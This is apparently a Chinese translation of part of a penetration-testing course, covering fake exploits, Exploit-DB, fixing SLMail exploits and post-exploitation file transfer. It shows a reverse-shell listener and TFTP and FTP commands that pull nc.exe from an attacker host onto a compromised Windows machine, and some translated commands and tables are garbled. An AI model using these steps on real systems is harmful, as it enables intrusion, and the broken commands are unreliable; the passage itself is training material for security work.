
现在我们理解了缓冲区溢出漏洞的原理，可以开始检查并使用别人的利用程序。这里有一个重要的问题：黑客经常发布伪利用程序，目的是破坏或损害运行这些代码的人。例如，下面的截图是在互联网上发现的伪 SSH 利用程序的几行：

```
root@kali:~# head -31 fake-ssh-exploit.c
* openssh-5.3p1-remote-root.c
* OpenSSH 5.3p1 Remote Root Exploit by theone
* Email: root@hotmail.com
* Released (private) / 2010
* Available Patch: No fix-patch has been issued or reported.

* Additional Notes:
* 通过使用此软件，你对所造成的损害
* 承担任何或全部责任，且不会向我 (theone) 抱怨。

* 请根据自己的情况谨慎使用此软件！菜手们小心。 :=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

#define VALID_OFFSET 0xffff
#define build(x,y,a)
char exploit[] = {
"\x99\xc4\xbdf\x76\x39\xbdf\x9d\x74\x24\xf4\x5b\x2b\xc9"
"\x81\x14\x31\x6b\x19\x83\xc3\x04\x03\x6b\x15\x19\x83\x08"
"\x64\x2a\x8f\x38\x87\x3a\xbd\x54\xc6\xb0\xa7\xab\xc8");
```

# 攻击性安全

www.offensive-security.com

使用 Kali Linux 进行渗透测试

Offensive Security 漏洞数据库 - Iceasel

# 漏洞数据库 (Exploit Database)

漏洞数据库 (EDB) 是漏洞和漏洞的终极存档，对于安全研究人员、研究人员和安全爱好者来说，都是极佳的资源。我们的目标是从提交和邮件列表中收集漏洞，并将它们集中在一个易于导航的数据库中。

GOOGLE

HACKING-DATASET

WordPress TimThumb 漏洞

CVE-XXXXX - 从 XSS 到远程代码执行

PHP Shell

欠款与暴露

# 远程漏洞

| 日期 | A | V | 描述 | 平台 | 作者 |
|---|---|---|---|---|---|
| 2013-04-12 | | | Hasegis Perl 插件执行器 任意命令执行 | 1798 | linux | metasploit |
| 2013-04-12 | | | IIS Web 服务器 6.048 - 栈配置绕过 | 278 | windows | exploit |
| 2013-04-12 | | | DirectX 9 内核远程命令执行 | 1121 | windows | metasploit |
| 2013-04-10 | | | Blget Server 2.97 - QODNF_Username 缓冲区溢出 | 1550 | windows | Craig Freeman |
| 2013-04-10 | | | Linksys WRT54G Gci 命令执行 | 1469 | hardware | metasploit |
| 2013-04-08 | | | Adobe ColdFusion AF53103 - 远程漏洞 | 1379 | multipalt | metasploit |
| 2013-04-08 | | | HelperDll6 setup.exe 命令执行 | 1806 | hardware | metasploit |

# 本地漏洞

| 日期 | A | V | 描述 | 平台 | 作者 |
|---|---|---|---|---|---|
| 2013-04-08 | | | Google AD Sync - 敏感信息泄露漏洞 | 984 | multipalt | Sense of Security |
| 2013-04-08 | | | IIS Splash 管理主页本地权限提升 | 910 | linux | metasploit |
| 2013-04-08 | | | PopOs 2.49 - 多种漏洞 | 753 | linux | John Carnaugh |

PWK 版权所有 2014 Offensive Security Ltd. 保留所有权利。第 174/361 页

# 使用 Kali Linux 进行渗透测试

SecurityFocus SE 漏洞报警通常包含漏洞代码：

| Bugtrap ID | |
| --- | --- |
| 57697 | |
| 类型 | 未知 |
| CVE | `CVE-2012-1541` |
| 远程 | 是 |
| 本地 | 否 |
| 发布日期 | 2013年2月01 12:00 AM |
| 更新日期 | 2013年4月16 10:28 AM |
| 致谢 | Oracle |
| 受影响范围 | Vulnerus FreeFlow Print Server (FFPS) 73.C0.41 |
| Ubuntu Linux 12.04 LTS i386 | |
| Ubuntu Linux 12.04 LTS amd64 | |
| Ubuntu Linux 11.10 i386 | |
| Ubuntu Linux 11.10 amd64 | |
| Ubuntu Linux 10.04 sparc | |
| Ubuntu Linux 10.04 powerpc | |

> 图 47 - SecurityFocus 漏洞信息

## 9.1.2 - 练习

（这些练习题不需要报告）

- 1. 识别具有问题历史的产品。识别通常难以修补的产品。
- 2. 观察发布的漏洞类型频率。你能识别出哪种类型的漏洞比其他类型更常见吗？
- 3. 理解报告的漏洞与漏洞利用程序之间的区别。

# 攻击性安全

www.offensive-security.com

使用 Kali Linux 进行渗透测试

# 9.2 - 自定义和修复漏洞

由于开发环境、受影响软件版本以及不同软件补丁的存在，可以理解互联网上找到的许多（如果不是大多数）公开漏洞无法开箱即用。我们将发现从错误的偏移量、针对不同操作系统或补丁级别的返回地址，到糟糕代码的所有问题。

更糟糕的是，许多漏洞可能是“一次性”的，这意味着如果漏洞利用失败，服务将崩溃，并在重启服务或重启机器之前将无法进行进一步的利用尝试。

## 9.2.1 - 设置开发环境

由于上述原因，我们绝不会在不检查代码和不理解其内部原理的情况下运行漏洞。一旦完成这些工作，我们将建立一个与操作系统版本和受影响软件版本匹配的小型开发环境，以便测试和改进现有的漏洞。当我们相当确定修复后的漏洞可以在目标机器上运行时，我们就可以继续对受害者发起攻击。

## 9.2.2 - 处理各种漏洞代码语言

漏洞代码可以以任何形式出现。从 `Python`、`Perl` 和 `Ruby` 脚本到 `C` 或 `C++`。更复杂的是，`C` 和 `C++` 等语言在 Linux/Unix 和 Windows 之间有不同的版本，且这种代码是不跨平台的。

例如，在我们之前搜索额外的 SLMail 漏洞时，在 exploitdb 存档中发现了多个结果。让我们仔细查看其中两个：`643.c` 和 `646.c`。

### 9.2.2.1 - 替换 Shellcode

通常情况下，公开漏洞的 shellcode 不符合我们的需求。

从弹出计算器的 shellcode，到可能不适合我们利用环境的绑定 shell（bind shells），再到硬编码 IP 的反向 shell（reverse shells）。

如果程序易于调试（例如 SLMail），或者漏洞对不同的缓冲区不敏感，那么替换漏洞的 shellcode 是一个相对简单的任务。

# 攻击性安全

www.offensive-security.com

使用 Kali Linux 进行渗透测试

一旦发送了固定的漏洞 payload，我们的新的反向 shell payload 就会执行，我们从 SLMail 服务器获取一个反向 shell。

```
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.10.5] from (UNKNOWN) [192.168.11.35] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

:\Program Files\SLMail\System>
```

无论我们是否从编译后的漏洞利用中获取 shell，请注意我们在 Linux 机器上编译了 Windows `C` 代码，然后运行了一个 Windows 可执行文件……在 Linux 上运行！

## 9.2.3 - 练习

- 修复并编译 `643.c` 以利用你的 SLMail 安装
- 在 Linux 下使用 `mingw` 修复并编译 `646.c`

# 10. - 文件传输

“后利用”（post exploitation）术语是指攻击者在获得目标部分控制权后执行的操作。这可能包括向机器上传文件和工具、提升权限、将控制权扩展到其他机器、安装后门、清理攻击证据等。然而，我们将采取的第一步之一是上传有助于我们后利用过程的文件。这可能包括编译后的二进制文件、命令行端口扫描器、后门和密码转储取器。

## 10.1 - 关于防病毒软件的几句话

后利用阶段是大多数渗透测试员遇到他们最大的对手之一的地方——杀毒软件。在大多数企业环境中，杀毒软件会被勤奋地安装在所有计算机上。该软件的主要目的是识别文件系统中对机器或网络构成威胁的文件。杀毒公司为已知恶意文件创建签名数据库。一旦发现已知签名的文件，它通常会被杀毒软件隔离并使其失效。更糟糕的是包含受影响文件信息的事件可能会警觉勤奋的管理员发现我们的存在。想象一下，在任务中进展到后期，你已经在内部机器上有了远程 shell……却因为杀毒软件检测到了你上传的某个文件而丢失了它，那种挫败感该有多如何。我们避免杀毒软件的一种常用方法是在后利用阶段使用合法的管理工具。我们将在课程后期介绍正确的工具后，再讨论绕过杀病毒的问题。

## 10.2 - 文件传输方法

不可避免的是，获得远程 shell 后要采取的第一步之一是向远程机器上传额外的工具。这将有助于建立并扩大我们对机器和网络的控制。当我们尝试在刚被攻破的机器上上传文件时，面临的初始限制是只能使用目标机器上已有的工具。在 Unix 环境中，我们通常会发现操作系统预装了 `netcat`、`curl` 或 `wget` 等工具，这使得从远程机器下载文件变得简单。然而，在 Windows 机器上，这个过程通常并不简单。

### 10.2.1 - 非交互式 shell

大多数类似于 `netcat` 的连接提供非交互式 shell。让我们看下面的示例。

在 Windows 机器的命令提示符中输入命令 `dir`。此命令是非交互的，因为一旦执行，它就不需要用户提供更多输入即可完成。现在尝试以下实验：从 Windows 命令行连接到 FTP 服务器并尝试登录。

```
C:\Users\offsec>ftp ftp.microsoft.com
Connected to ftp.microsoft.adns.net.
220 Microsoft FTP Service
User (ftp.microsoft.adns.net:(none)): test
331 Password required for test.
Password: test
530 User cannot log in.
Login failed.
ftp> bye
221 Thank you for using Microsoft products.
C:\Users\offsec>
```

尽管登录失败了，但请注意 `ftp.exe` 客户端进程只有在我们与其交互并给出 `bye` 命令后才退出。这是一个需要用户干预才能完成的交互式程序。

交互式程序的标准输出没有正确重定向到 shell，如果你尝试这样做，通常会超时或与 shell 断开连接。自己实验一下。尝试从远程 shell 登录 FTP 服务器，看看会发生什么。

## 10.2.2 - 上传文件

根据你正在使用的底层操作系统，被攻破的机器上可能已经存在多种工具可以帮助你上传文件。

### 10.2.2.1 - 使用 TFTP 上传文件

TFTP 是一种基于 UDP 的文件传输协议，通常受到企业出站防火墙规则的限制。直到 Windows XP 和 2003 的 Windows 操作系统默认包含 TFTP 客户端。在 Windows 7、2008 及更高版本中，此工具需要在安装期间显式添加。由于这些原因，在大多数情况下，TFTP 不是理想的文件传输协议。另一方面，TFTP 文件传输的大优势是 tftp 客户端可以交互式工作，如果存在正确的条件，文件传输将变得简单。我们需要在 Kali 中设置 TFTP 服务器。

```
root@kali:~# mkdir /tftp
root@kali:~# atftp --daemon --port 69 /tftp
root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
```

在这个示例中，我们将从 Kali 机器向 Windows 7 机器提供 `nc.exe` 文件。我们在 Windows 7 机器上使用类似下面的参数调用 tftp 客户端。

```
C:\Users\Offsec>tftp -i 192.168.10.5 get nc.exe
Transfer successful: 59392 bytes in 16 second(s), 3712 bytes/s
```

### 10.2.2.2 - 使用 FTP 上传文件

Windows 操作系统包含默认的 FTP 客户端，也可用于文件传输。正如我们之前看到的，`ftp.exe` 客户端是一个需要输入才能完成的交互式程序。在尝试将 FTP 作为文件传输协议之前，我们需要解决这个问题。ftp 帮助选项 (`-h`) 有一些可以帮助我们的子句：

![](img/ea60ac7a8762deadd3823235c817f96d_184_0.png)

我们可以通过为 `ftp.exe` 客户端提供包含要执行命令的文本文件，将 FTP 文件传输转换为非交互式过程。在攻击端，我们需要设置一个 FTP 服务器，受害者将连接到那里并下载请求的文件。

按照如下方式在 Kali 中快速安装 FTPTPd 服务器：

```
root@kali:~# apt-get update && apt-get install-ftpd
```

在任何客户端连接到我们的 FTP 服务器之前，我们首先需要为 PureFtp 创建新用户。以下 Bash 脚本将为我们自动化创建创建：

```bash
#!/bin/bash

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /ftphome
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mk
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

然后我们运行脚本并在提示时为 offsec 提供密码：

```
root@kali:~# chmod 755 setup-ftp
root@kali:~# ./setup-ftp
Password:
Enter it again:
Restarting ftp server
```

配置好我们的 FTP 服务器后，我们现在可以将以下命令粘贴到远程 Windows shell 中，并通过 FTP 非交互式地下载文件。

```
C:\Users\offsec>echo open 192.168.10.5 21 ftp.txt
C:\Users\offsec>echo ftp >> ftp.txt
C:\Users\offsec>echo ftp >> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo get nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt
C:\Users\offsec>ftp -s:ftp.txt
```

# 渗透测试

www.offensive-security.com

使用 Kali Linux 进行渗透测试

## 10.2.2.3 - 使用脚本语言上传文件

脚本引擎如 `VBScript`（在 Windows XP, 2003 中）和 `PowerShell`（在 Windows 7, 2008 及以上版本中）可以用于将文件下载到受害者机器。例如，以下非交互式 echo 命令在粘贴到远程 shell 时，将使用作为一个简单 HTTP 下载器的 `VBScript` 脚本。
